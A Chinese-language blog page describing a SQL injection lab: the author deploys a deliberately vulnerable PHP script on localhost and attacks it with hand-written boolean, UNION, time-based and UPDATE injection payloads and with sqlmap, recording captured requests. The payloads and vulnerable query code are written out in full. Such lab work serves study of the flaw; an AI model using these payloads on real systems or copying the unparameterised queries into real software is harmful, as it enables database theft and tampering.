@@ -1,0 +1,1306 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon1_32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon1_16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="MySQL注入实验,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="HengYuD" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="实验目的研究 SQL 注入的原理， 通过搭建具有 SQL 注入的服务器的环境， 分别用Sqlmap 和手工注入的方式， 结合 WireShark 抓包分析， 进一步理解 SQL 注入的本质； 本实验通过在服务端部署具有 SQL 注入漏洞的 PHP 脚本，在 Ubuntu 系统上采用 Firefox浏览器的 url 执行手工注入， 而采用 Sqlmap 执行自动化注入； 采用不同的防注入手段， 再尝">
+<meta name="keywords" content="MySQL注入实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mysql注入测试实验">
+<meta property="og:url" content="https://hengyud.cn/mysql注入测试实验/index.html">
+<meta property="og:site_name" content="HengYuD">
+<meta property="og:description" content="实验目的研究 SQL 注入的原理， 通过搭建具有 SQL 注入的服务器的环境， 分别用Sqlmap 和手工注入的方式， 结合 WireShark 抓包分析， 进一步理解 SQL 注入的本质； 本实验通过在服务端部署具有 SQL 注入漏洞的 PHP 脚本，在 Ubuntu 系统上采用 Firefox浏览器的 url 执行手工注入， 而采用 Sqlmap 执行自动化注入； 采用不同的防注入手段， 再尝">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/1.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/2.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/4.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/3.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/7.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/5.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/6.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/8.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/9.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/10.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/11.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/12.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/18.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/13.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/19.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/14.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/21.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/20.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/22.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/15.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/16.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/23.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/17.png">
+<meta property="og:image" content="https://hengyud.cn/mysql注入测试实验/24.png">
+<meta property="og:updated_time" content="2019-07-14T12:37:11.416Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mysql注入测试实验">
+<meta name="twitter:description" content="实验目的研究 SQL 注入的原理， 通过搭建具有 SQL 注入的服务器的环境， 分别用Sqlmap 和手工注入的方式， 结合 WireShark 抓包分析， 进一步理解 SQL 注入的本质； 本实验通过在服务端部署具有 SQL 注入漏洞的 PHP 脚本，在 Ubuntu 系统上采用 Firefox浏览器的 url 执行手工注入， 而采用 Sqlmap 执行自动化注入； 采用不同的防注入手段， 再尝">
+<meta name="twitter:image" content="https://hengyud.cn/mysql注入测试实验/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hengyud.cn/mysql注入测试实验/">
+
+
+
+
+
+  <title>mysql注入测试实验 | HengYuD</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">HengYuD</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hengyud.cn/mysql注入测试实验/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="HengYuD">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HengYuD">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">mysql注入测试实验</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-14T20:27:25+08:00">
+                2019-07-14
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-14T20:37:11+08:00">
+                2019-07-14
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>研究 SQL 注入的原理， 通过搭建具有 SQL 注入的服务器的环境， 分别用Sqlmap 和手工注入的方式， 结合 WireShark 抓包分析， 进一步理解 SQL 注入的本质；</p>
+<p>本实验通过在服务端部署具有 SQL 注入漏洞的 PHP 脚本，在 Ubuntu 系统上采用 Firefox浏览器的 url 执行手工注入， 而采用 Sqlmap 执行自动化注入；</p>
+<p>采用不同的防注入手段， 再尝试 Sqlmap 注入， 观察结果 </p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>ubuntu16.04、apache2、mysql、php7、sqlmap、</p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>​        <strong>搭建 mysql 数据库，建立数据库 test，数据表 student，包含 id、name、score 三列</strong></p>
+<p>​        <code>mysql -u root -p test</code></p>
+<p><img src="/mysql注入测试实验/1.png" alt="1"></p>
+<p>​        <strong>编写有 sql 注入漏洞接口程序的php文件，放入<code>/var/www/html/</code>目录下</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'op'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">	&#123; </span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"连接 MySQL 失败: "</span> . mysqli_connect_error(); </span><br><span class="line">	&#125;</span><br><span class="line">	$sql = mysqli_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'65412345'</span>,<span class="string">'test'</span>);</span><br><span class="line">	<span class="keyword">if</span>($sql) &#123;</span><br><span class="line">		$op = $_GET[<span class="string">'op'</span>];</span><br><span class="line">		<span class="keyword">switch</span>($op) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>: <span class="comment">//输入学号显示姓名和分数</span></span><br><span class="line">				$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">				$res = mysqli_query($sql,<span class="string">"select * from student where id = '$id';"</span>);</span><br><span class="line">				<span class="keyword">while</span>($row = mysqli_fetch_array($res)) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'name： '</span>.$row[<span class="string">'name'</span>].<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'score： '</span>.$row[<span class="string">'score'</span>];</span><br><span class="line">				&#125; </span><br><span class="line">               	<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>: <span class="comment">//输入学号展示学生是否存在</span></span><br><span class="line">				$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">				$res = mysqli_query($sql,<span class="string">"select * from student where id = '$id';"</span>);</span><br><span class="line">				$row = mysqli_fetch_array($res);</span><br><span class="line">				<span class="keyword">if</span>($row) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'exist'</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'not exist'</span>;</span><br><span class="line">				&#125; </span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>: <span class="comment">//将查询结果是否为空展示在两段随机内容之间</span></span><br><span class="line">				$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">				$res = mysqli_query($sql,<span class="string">"select * from student where id = '$id';"</span>);</span><br><span class="line">				$row = mysqli_fetch_array($res);</span><br><span class="line">				<span class="keyword">if</span>($row) &#123;</span><br><span class="line">					<span class="keyword">echo</span> rand().<span class="string">'exist'</span>.rand();</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> rand().<span class="string">'not exist'</span>.rand();</span><br><span class="line">				&#125; </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>: <span class="comment">//输入学号， 查询成绩是否大于 60， 结果展示在两段随机内容之间</span></span><br><span class="line">				$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">				$res = mysqli_query($sql,<span class="string">"select * from student where id = '$id';"</span>);</span><br><span class="line">				$row = mysqli_fetch_array($res);</span><br><span class="line">				<span class="keyword">if</span>($row) &#123;</span><br><span class="line">					$res = mysqli_query($sql,<span class="string">"select * from student where id = '$id' and score &gt; 60;"</span>);</span><br><span class="line">					$row = mysqli_fetch_array($res);</span><br><span class="line">					<span class="keyword">if</span>($row) &#123;</span><br><span class="line">						<span class="keyword">echo</span> rand().<span class="string">'(score &gt; 60)'</span>.rand();</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="keyword">echo</span> rand().<span class="string">'(score &lt;= 60)'</span>.rand();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> rand().<span class="string">'not exist'</span>.rand();</span><br><span class="line">				&#125; </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>: <span class="comment">//输入学号展示学生是否存在， 但输出固定内容</span></span><br><span class="line">				$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">				$res = mysqli_query($sql,<span class="string">"select * from student where id = '$id';"</span>);</span><br><span class="line">				$row = mysqli_fetch_array($res);</span><br><span class="line">				<span class="keyword">if</span>($row) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'query ok'</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'query ok'</span>;</span><br><span class="line">				&#125; </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>: <span class="comment">//输入学号和分数， 更新对应学生的分数</span></span><br><span class="line">				$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">				$score = $_GET[<span class="string">'score'</span>];</span><br><span class="line">				<span class="keyword">if</span>(mysqli_query($sql,<span class="string">"update student set score ='$score' where id = '$id';"</span>)) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'update ok'</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'updata fail'</span>;</span><br><span class="line">				&#125; </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"connect error: "</span> . mysqli_connect_error());</span><br><span class="line">		&#125; </span><br><span class="line">    	mysqli_close($sql);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="功能实现并手工注入"><a href="#功能实现并手工注入" class="headerlink" title="功能实现并手工注入"></a>功能实现并手工注入</h2><p><strong>输入的学号展示姓名和分数</strong>（op=1）</p>
+<p><img src="/mysql注入测试实验/2.png" alt="2"></p>
+<p>布尔盲注?op=1&amp;id=1’or’1’=’1 </p>
+<p>构成 select * from student where id = ‘1’ or ‘1’ = ‘1’ </p>
+<p><img src="/mysql注入测试实验/4.png" alt="4"></p>
+<p>联合注入?op=1&amp;id=111’ union all select table_schema,table_name,table_schema from information_schema.tables where ‘1’ = ‘1 </p>
+<p>可以爆出了所有的数据库， 以及数据库下对应的表 </p>
+<p><img src="/mysql注入测试实验/3.png" alt="3"></p>
+<p>也可以选择已知的数据库名和表明来构造</p>
+<p>?op=1&amp;id=111’ union all select column_name,data_type,column_name from information_schema.columns where table_schema = ‘test’ and table_name = ‘student </p>
+<p><img src="/mysql注入测试实验/7.png" alt="7"></p>
+<p><strong>输入学号，展示是否有该学生存在</strong>（op=2）</p>
+<p><img src="/mysql注入测试实验/5.png" alt="5"></p>
+<p><img src="/mysql注入测试实验/6.png" alt="6"></p>
+<p>可以通过返回结果的不同遍历出存在的值或者数据库，也可以改变sql查询的语义来查询其它数据库中各项的值</p>
+<p><strong>将查询结果是否为空展示在两段随机内容之间</strong>（op=3）</p>
+<p><img src="/mysql注入测试实验/8.png" alt="8"></p>
+<p><img src="/mysql注入测试实验/9.png" alt="9"></p>
+<p>​        发现在结果前后添加任意长的随机字符与不增加随机字符相比在本质上并没有安全，只是使得攻击脚本增加提取字符串的步骤，提高了爆破的时间成本。</p>
+<p><strong>展示查询结果的条件表达式结果，将结果展示在两段随机内容之间</strong>（op=4）</p>
+<p>如入学号，展示该学生分数是否大于 60。</p>
+<p><img src="/mysql注入测试实验/10.png" alt="10"></p>
+<p>查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">				$res = mysqli_query($sql,&quot;select * from student where id = &apos;$id&apos;;&quot;);</span><br><span class="line">				$row = mysqli_fetch_array($res);</span><br><span class="line">				if($row) &#123;</span><br><span class="line">					$res = mysqli_query($sql,&quot;select * from student where id = &apos;$id&apos; and score &gt; 60;&quot;);</span><br><span class="line">					$row = mysqli_fetch_array($res);</span><br><span class="line">					if($row) &#123;</span><br><span class="line">						echo rand().&apos;(score &gt; 60)&apos;.rand();</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						echo rand().&apos;(score &lt;= 60)&apos;.rand();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					echo rand().&apos;not exist&apos;.rand();</span><br><span class="line">				&#125; </span><br><span class="line">                break;</span><br></pre></td></tr></table></figure>
+<p>​        首先要保证 id 在数据库中存在的才能绕过第一个 SQL 查询语句，利用第二个查询语句回显的不同结果来猜测字段的值。第二个语句中的 and score &gt; 60 给注入增加了麻烦， 若联合查询查询其它表中的信息，会因为没有 score 字段而无法让反馈信息按照我们想要的方式展现，可以将目标 SQL 语句夹在多个 union all 中间来绕过限制。</p>
+<p><strong>根据输入的参数值，拼接 SQL 查询语句并执行，但展示一个固定的结果</strong>（op=5）</p>
+<p>如输入学号查询学生是否存在，输出固定内容</p>
+<p>此接口的设计， 适用不需要回显查询结果的场景，这种场景下，利用查询结果的回显来猜测字段的值的方法不适用，可以采用延时注入的方法。将 sleep(5)加入到 union all 后边的 select 语句的 where 条件部分， 当数值猜测正确， 浏览器会多加载 5s 的时间， 根据页面加载时间来判断表项数值的猜测是否正确。即通过添加条件判断到SQL中，比如IF(substring(version(),1,1)=5, sleep(5), ‘t’) AS value就能做到类似boolean注入的效果。</p>
+<p>可以用F12里面的 Network 来查看加载时间</p>
+<p><img src="/mysql注入测试实验/11.png" alt="11"></p>
+<p><strong>更新数据库</strong>（op=6）</p>
+<p>如输入学号和分数，将对应学生的分数更新。</p>
+<p>这是对于 update 语句的注入， 常用基于报错、 基于时间延迟这两种注入方法。 采取基于报错的 SQL 注入， 发现并未有报错显示， 猜测报错被关闭， 所以， 我们可以采用基于时间延迟的注入。 </p>
+<p>先猜测当前数据库名称的长度，–+是 MySQL 中的单行注释符号，用于注释掉后边的单引号，也可以采用%23， 转义后为#， 也同样起到注释的作用<br>?op=6&amp;score=100&amp;id=111’ and if(length(database())=4,sleep(5),1) –+ </p>
+<h2 id="用-sqlmap-尝试各种注入方式并用-wireshark-抓包，记录每次的目标、SQL-命令行、结果（包括出结果的过程、和最终的输出）、和抓包文件"><a href="#用-sqlmap-尝试各种注入方式并用-wireshark-抓包，记录每次的目标、SQL-命令行、结果（包括出结果的过程、和最终的输出）、和抓包文件" class="headerlink" title="用 sqlmap 尝试各种注入方式并用 wireshark 抓包，记录每次的目标、SQL 命令行、结果（包括出结果的过程、和最终的输出）、和抓包文件"></a>用 sqlmap 尝试各种注入方式并用 wireshark 抓包，记录每次的目标、SQL 命令行、结果（包括出结果的过程、和最终的输出）、和抓包文件</h2><h3 id="op-1"><a href="#op-1" class="headerlink" title="op=1"></a>op=1</h3><p>sqlmap -u “<a href="http://127.0.0.1/sql_test.php?op=1&amp;id=11110000001&quot;" target="_blank" rel="noopener">http://127.0.0.1/sql_test.php?op=1&amp;id=11110000001&quot;</a> -D test –flush-session</p>
+<p><img src="/mysql注入测试实验/12.png" alt></p>
+<p><img src="/mysql注入测试实验/18.png" alt="18"></p>
+<p>op=1&amp;id=11110000001%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29fdoA%29%20AND%20%27EnPH%27%3D%27EnPH </p>
+<p><code>op=1&amp;id=11110000001&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))fdoA) AND &#39;EnPH&#39;=&#39;EnPH</code></p>
+<h3 id="op-2"><a href="#op-2" class="headerlink" title="op=2"></a>op=2</h3><p>sqlmap -u “<a href="http://127.0.0.1/sql_test.php?op=2&amp;id=11110000001&quot;" target="_blank" rel="noopener">http://127.0.0.1/sql_test.php?op=2&amp;id=11110000001&quot;</a> -D test –flush-session</p>
+<p><img src="/mysql注入测试实验/13.png" alt></p>
+<p><img src="/mysql注入测试实验/19.png" alt>op=2&amp;id=11110000001%27%20AND%206489%3D6489%20AND%20%27QACF%27%3D%27QACF </p>
+<p><code>op=2&amp;id=11110000001&#39; AND 6489=6489 AND &#39;QACF&#39;=&#39;QACF</code></p>
+<h3 id="op-3"><a href="#op-3" class="headerlink" title="op=3"></a>op=3</h3><p>sqlmap -u “<a href="http://127.0.0.1/sql_test.php?op=3&amp;id=11110000001&quot;" target="_blank" rel="noopener">http://127.0.0.1/sql_test.php?op=3&amp;id=11110000001&quot;</a> -D test –flush-session</p>
+<p><img src="/mysql注入测试实验/14.png" alt></p>
+<p>随机内容对工具起了作用， 其动态的干扰让工具无法基于 YES or NO 两种情 况来 判 断是否存在 Boolean-based blind ， 而实际上SQL 注入漏洞是存在的  </p>
+<p><img src="/mysql注入测试实验/21.png" alt></p>
+<p><img src="/mysql注入测试实验/20.png" alt></p>
+<p><img src="/mysql注入测试实验/22.png" alt></p>
+<p>op=3&amp;id=11110000111%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29sKzT%29%20AND%20%27oBjS%27%3D%27oBjS </p>
+<p><code>op=3&amp;id=11110000111&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))sKzT) AND &#39;oBjS&#39;=&#39;oBjS</code></p>
+<h3 id="op-4"><a href="#op-4" class="headerlink" title="op=4"></a>op=4</h3><p>sqlmap -u “<a href="http://127.0.0.1/sql_test.php?op=4&amp;id=11110000001&quot;" target="_blank" rel="noopener">http://127.0.0.1/sql_test.php?op=4&amp;id=11110000001&quot;</a> -D test –flush-session –dbms=MySQL</p>
+<p><img src="/mysql注入测试实验/15.png" alt></p>
+<p>之所以没有扫描出注入点， 一是输出的随机内容的干扰， 二是条件查询语句中的 score &gt;60 工具的基本框架中， 没有像前方手工注入那样构造出多个 union all 组合的灵活语句来处理 score &gt; 60 这个特定的问题。需要手动推理和分析后台可能的 SQL 句式 </p>
+<h3 id="op-5"><a href="#op-5" class="headerlink" title="op=5"></a>op=5</h3><p>sqlmap -u “<a href="http://127.0.0.1/sql_test.php?op=5&amp;id=11110000001&quot;" target="_blank" rel="noopener">http://127.0.0.1/sql_test.php?op=5&amp;id=11110000001&quot;</a> -D test –flush-session –dbms=MySQL</p>
+<p><img src="/mysql注入测试实验/16.png" alt></p>
+<p><img src="/mysql注入测试实验/23.png" alt></p>
+<p>op=5&amp;id=11110000111%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29TwTX%29%20AND%20%27Ztqw%27%3D%27Ztqw </p>
+<p><code>op=5&amp;id=11110000111&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))TwTX) AND &#39;Ztqw&#39;=&#39;Ztqw</code></p>
+<h3 id="op-6"><a href="#op-6" class="headerlink" title="op=6"></a>op=6</h3><p>sqlmap -u “<a href="http://127.0.0.1/sql_test.php?op=6&amp;id=11110000001&amp;score=66&quot;" target="_blank" rel="noopener">http://127.0.0.1/sql_test.php?op=6&amp;id=11110000001&amp;score=66&quot;</a> -D test –flush-session</p>
+<p><img src="/mysql注入测试实验/17.png" alt></p>
+<p><img src="/mysql注入测试实验/24.png" alt></p>
